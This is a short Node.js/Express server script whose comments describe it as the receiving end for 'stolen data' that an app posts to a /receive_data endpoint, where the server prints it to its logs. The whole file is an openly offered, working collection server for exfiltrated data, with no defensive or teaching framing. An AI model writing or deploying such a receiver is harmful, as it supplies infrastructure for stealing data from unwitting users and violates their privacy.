// This is a standard Node.js/Express server
const express = require('express');
const app = express();
const port = process.env.PORT || 3000;

// CRITICAL: This tells the server to understand JSON data from the app
app.use(express.json());

// This is the endpoint that receives the stolen data
app.post('/receive_data', (req, res) => {
    console.log('--- NEW DATA RECEIVED ---');
    
    // The app sends data like {"data": "some text"}
    // We access it with req.body.data
    const stolenData = req.body.data;

    if (stolenData) {
        // This prints the stolen text to your server logs
        console.log(stolenData);
    } else {
        console.log('Error: No data found in request body.');
        console.log('Request received:', req.body); // For debugging
    }

    console.log('-------------------------');
    
    // Send a "OK" response back to the app
    res.status(200).send('Data received');
});

// This starts the server
app.listen(port, () => {
    console.log(`Server is running and listening on port ${port}`);
});
